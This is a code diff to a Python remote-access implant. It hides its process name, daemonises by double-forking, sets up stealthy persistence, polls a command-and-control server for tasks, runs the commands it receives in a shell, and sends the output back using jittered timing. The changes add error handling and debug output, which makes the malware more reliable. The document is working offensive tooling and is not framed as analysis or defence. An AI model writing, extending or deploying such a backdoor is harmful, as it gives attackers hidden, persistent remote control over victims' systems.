@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import os, sys, ctypes, random
+import os, sys, ctypes, random, base64
 
 # Immediate stealth - before any other imports
 def immediate_stealth():
@@ -12,14 +12,28 @@ def immediate_stealth():
         ctypes.CDLL(None).prctl(15, new_name.encode())
         
         # Fork to detach
-        if os.fork() > 0:
+        pid = os.fork()
+        if pid > 0:
             os._exit(0)
-        os.setsid()
-        if os.fork() > 0:
-            os._exit(0)
-        
-        return True
-    except:
+        elif pid == 0:
+            # Child process continues
+            os.setsid()
+            pid = os.fork()
+            if pid > 0:
+                os._exit(0)
+            elif pid == 0:
+                # Second child continues
+                return True
+            else:
+                # Second fork failed
+                print_debug("Second fork failed")
+                return False
+        else:
+            # First fork failed
+            print_debug("First fork failed")
+            return False
+    except Exception as e:
+        print_debug(f"Stealth initialization failed: {e}")
         return False
 
 # Apply stealth immediately
@@ -723,13 +737,13 @@ class AdaptiveC2Client:
     def _make_request(self, endpoint, data, method="GET"):
         """Make HTTPS request with enhanced stealth techniques"""
         if self.stealth_mode:
-        # Convert data to bytes if needed
+            # Convert data to bytes if needed
             if isinstance(data, dict):
                 data_bytes = json.dumps(data).encode()
             else:
                 data_bytes = data
             return _stealth_request(f"{self.c2_server}/{endpoint}", data_bytes, timeout=10)
-    
+        
         headers = {
             "User-Agent": random.choice(self.user_agents),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
@@ -903,8 +917,6 @@ class AdaptiveC2Client:
 # Integration with the existing code
 def main():
 
-    immediate_stealth()
-
     create_stealthy_persistence()
 
     STEALTH_MODE = True
@@ -932,38 +944,49 @@ def main():
             try:
                 # Use 'response' here, as that is what the server just sent back
                 desired_pause_until = float(response) 
-            except:
-                print(f"pause conversion: received {response} but could not convert to float")
+            except (ValueError, TypeError) as e:
+                print_debug(f"pause conversion: received {response} but could not convert to float: {e}")
                 desired_pause_until = 0
+        else:
+            print_debug(f"Failed to get pause status: {response}")
+            desired_pause_until = 0
 
-            if desired_pause_until > time.time():
-                time.sleep(desired_pause_until - time.time())
+        if desired_pause_until > time.time():
+            time.sleep(desired_pause_until - time.time())
         
         # Let's see if any tasks are waiting for this agent
         status, response = send_message("agent/get_task", stealth_mode=STEALTH_MODE)
         if status:
             if response != "no pending tasks":
-                data = json.loads(response)
-                task_id = data.get('task_id')
-                task_command = data.get('task')
-                
                 try:
-                    resultobj = subprocess.run(
-                        task_command,
-                        shell=True,
-                        capture_output=True, 
-                        text=True,
-                        timeout=15,
-                        check=False
-                    )
-                    result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
-                except Exception as E:
-                    print_debug(f"subprocess exception: {E}")
-                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}"
-                finally:
-                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
-                    send_message("agent/set_task_result", message=resultjson, stealth_mode=STEALTH_MODE)
-        
+                    data = json.loads(response)
+                    task_id = data.get('task_id')
+                    task_command = data.get('task')
+                    
+                    if not task_id or not task_command:
+                        print_debug(f"Invalid task data: {data}")
+                    else:
+                        try:
+                            resultobj = subprocess.run(
+                                task_command,
+                                shell=True,
+                                capture_output=True, 
+                                text=True,
+                                timeout=15,
+                                check=False
+                            )
+                            result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
+                        except Exception as E:
+                            print_debug(f"subprocess exception: {E}")
+                            result = f"unexpected exception when trying to execute task: {str(E)[:100]}"
+                        finally:
+                            resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
+                            send_message("agent/set_task_result", message=resultjson, stealth_mode=STEALTH_MODE)
+                except json.JSONDecodeError as e:
+                    print_debug(f"Failed to parse task JSON: {e}, response: {response}")
+        else:
+            print_debug(f"Failed to get task: {response}")
+                
         # Add jitter to sleep time
         jittered_sleep = 60 + random.randint(-10, 10)
         time.sleep(jittered_sleep)
